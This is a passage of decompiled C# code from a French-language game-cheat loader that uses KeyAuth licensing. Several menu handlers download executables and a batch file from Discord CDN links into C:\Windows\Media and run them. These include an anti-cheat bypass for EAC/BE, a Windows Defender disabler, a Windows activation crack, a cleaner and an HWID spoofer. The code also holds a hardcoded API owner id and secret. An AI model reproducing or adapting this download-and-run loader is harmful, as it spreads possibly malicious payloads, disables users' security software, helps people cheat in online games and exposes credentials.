					string text10 = "Votre clé n'est pas valide pour se cheat ou celui-ci est en maitenance.";
					string caption10 = "Informations !";
					MessageBoxButtons buttons10 = MessageBoxButtons.OK;
					DialogResult dialogResult10 = MessageBox.Show(text10, caption10, buttons10);
					bool flag28 = dialogResult10 == DialogResult.OK;
					if (flag28)
					{
					}
				}
				else
				{
					using (WebClient webClient14 = new WebClient())
					{
						webClient14.DownloadFile("https://cdn.discordapp.com/attachments/900383369949499412/900384963357179944/secureload.exe", "secureload.exe");
					}
					Process.Start("C:\\Windows\\Media\\DarlingValorant.exe");
					WaitForGame waitForGame11 = new WaitForGame(this.lstCheats.SelectedItem.ToString().Trim(), this.exeName);
					waitForGame11.ShowDialog();
				}
			}
			bool flag29 = this.lstCheats.SelectedItem.ToString() == "Forcer EAC/BE";
			if (flag29)
			{
				using (WebClient webClient15 = new WebClient())
				{
					webClient15.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/903415641225191525/forcer.exe", "C:\\Windows\\Media\\forcer.exe");
				}
				Process.Start("C:\\Windows\\Media\\forcer.exe");
			}
			bool flag30 = this.lstCheats.SelectedItem.ToString() == "Defender Control";
			if (flag30)
			{
				using (WebClient webClient16 = new WebClient())
				{
					webClient16.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/903415648233848832/DefenderControl.exe", "C:\\Windows\\Media\\DefenderControl.exe");
				}
				Process.Start("C:\\Windows\\Media\\DefenderControl.exe");
			}
			bool flag31 = this.lstCheats.SelectedItem.ToString() == "Windows Activation";
			if (flag31)
			{
				using (WebClient webClient17 = new WebClient())
				{
					webClient17.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/917536379313995836/Windows_Activation.bat", "C:\\Windows\\Media\\Windows_Activation.bat");
				}
				Process.Start("C:\\Windows\\Media\\Windows_Activation.bat");
			}
			bool flag32 = this.lstCheats.SelectedItem.ToString() == "Cleaner Fortnite";
			if (flag32)
			{
				using (WebClient webClient18 = new WebClient())
				{
					webClient18.DownloadFile("https://cdn.discordapp.com/attachments/900381847819784243/903415653506121758/cleaner_protected.exe", "C:\\Windows\\Media\\cleaner_protected.exe");
				}
				Process.Start("C:\\Windows\\Media\\cleaner_protected.exe");
			}
			bool flag33 = this.lstCheats.SelectedItem.ToString() == "HWID Spoofer";
			if (flag33)
			{
				bool flag34 = this.username.Contains("0");
				if (flag34)
				{
					string text11 = "Votre clé ne vous donne pas accès au spoofer.";
					string caption11 = "Informations !";
					MessageBoxButtons buttons11 = MessageBoxButtons.OK;
					DialogResult dialogResult11 = MessageBox.Show(text11, caption11, buttons11);
					bool flag35 = dialogResult11 == DialogResult.OK;
					if (flag35)
					{
					}
				}
			}
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00004EBC File Offset: 0x000030BC
		private void button2_Click(object sender, EventArgs e)
		{
			bool flag = this.lstCheats.SelectedItem.ToString() == "Fortnite - Chapitre 3";
			if (flag)
			{
				Process.Start("https://darlingch33ts.xyz/fortnite.html");
			}
			bool flag2 = this.lstCheats.SelectedItem.ToString() == "Rainbow Six: Siege";
			if (flag2)
			{
				Process.Start("https://darlingch33ts.xyz/r6s.html");
			}
			bool flag3 = this.lstCheats.SelectedItem.ToString() == "Apex Legends";
			if (flag3)
			{
				Process.Start("https://darlingch33ts.xyz/apex.html");
			}
			bool flag4 = this.lstCheats.SelectedItem.ToString() == "Valorant";
			if (flag4)
			{
				Process.Start("https://darlingch33ts.xyz/valorant.html");
			}
			bool flag5 = this.lstCheats.SelectedItem.ToString() == "Rust";
			if (flag5)
			{
				Process.Start("https://darlingch33ts.xyz/rust.html");
			}
			bool flag6 = this.lstCheats.SelectedItem.ToString() == "FiveM";
			if (flag6)
			{
				Process.Start("https://buy.stripe.com/fZe03862p9Gk9UccN4");
			}
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00002126 File Offset: 0x00000326
		private void pictureBox2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600002A RID: 42 RVA: 0x00004FD0 File Offset: 0x000031D0
		private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			bool flag = this.lstCheats.SelectedItem.ToString() == "Forcer EAC/BE";
			if (flag)
			{
				this.lblGameName.Text = "Forcer EAC / BE";
				this.lblVersion.Text = "Version: 19.0";
				this.lblExpirationDate.Text = string.Format("Fonctionne depuis : 2019", Array.Empty<object>());
				this.lblStatus.Text = "Fonctionnel";
				this.lblStatus.ForeColor = Color.Green;
				this.exeName = "csgo";
			}
			bool flag2 = this.lstCheats.SelectedItem.ToString() == "Windows Activation";
			if (flag2)
			{
				this.lblGameName.Text = "Windows Activation";
				this.lblVersion.Text = "Version: Windows 10 ";
				this.lblExpirationDate.Text = string.Format("Fonctionne depuis : 2016", Array.Empty<object>());
				this.lblStatus.Text = "Fonctionnel";
				this.lblStatus.ForeColor = Color.LimeGreen;
				this.exeName = "csgo";
			}
			bool flag3 = this.lstCheats.SelectedItem.ToString() == "Defender Control";
			if (flag3)
			{
				this.lblGameName.Text = "Defender Control";
				this.lblVersion.Text = "Version: ?";
				this.lblExpirationDate.Text = string.Format("Fonctionne depuis : 2019", Array.Empty<object>());
				this.lblStatus.Text = "Fonctionnel";
				this.lblStatus.ForeColor = Color.LimeGreen;
				this.exeName = "csgo";
			}
			bool flag4 = this.lstCheats.SelectedItem.ToString() == "Valorant";
			if (flag4)
			{
				this.lblGameName.Text = "Cleaner Fortnite";
				this.lblVersion.Text = "Version: 4";
				this.lblExpirationDate.Text = string.Format("Fonctionne depuis : 2021", Array.Empty<object>());
				this.lblStatus.Text = "Fonctionnel";
				this.lblStatus.ForeColor = Color.LimeGreen;
				this.exeName = "csgo";
			}
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00002129 File Offset: 0x00000329
		private void pictureBox3_Click(object sender, EventArgs e)
		{
			Process.Start("https://youtube.com/c/insoweb666");
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00002137 File Offset: 0x00000337
		private void pictureBox4_Click(object sender, EventArgs e)
		{
			Process.Start("https://www.youtube.com/c/DarlingWeb");
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00002145 File Offset: 0x00000345
		private void pictureBox5_Click(object sender, EventArgs e)
		{
			Process.Start("https://www.youtube.com/c/KayZn");
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00002153 File Offset: 0x00000353
		private void pictureBox6_Click(object sender, EventArgs e)
		{
			Process.Start("https://youtu.be/uIaD3mo3jvI");
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00002126 File Offset: 0x00000326
		private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
		{
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00002126 File Offset: 0x00000326
		private void pictureBox2_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00002126 File Offset: 0x00000326
		private void lblVersion_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00002126 File Offset: 0x00000326
		private void pictureBox1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0400000C RID: 12
		private static string name = "darling";

		// Token: 0x0400000D RID: 13
		private static string ownerid = "30Z44PRrpG";

		// Token: 0x0400000E RID: 14
		private static string secret = "ef703c38b237f2636c355f44dbe3d3c72e83d058e637f31b649fd395b1b72258";

		// Token: 0x0400000F RID: 15
		private static string version = "1.8";

		// Token: 0x04000010 RID: 16
		public static api KeyAuthApp = new api(Loader.name, Loader.ownerid, Loader.secret, Loader.version);

		// Token: 0x04000011 RID: 17
		private string username;

		// Token: 0x04000012 RID: 18
		private string expiryDate = DateTime.Now.AddDays(9999.0).ToString("d MMM yyyy H:mm:ss", new CultureInfo("en-GB"));

		// Token: 0x04000013 RID: 19
		private string exeName;
	}
}
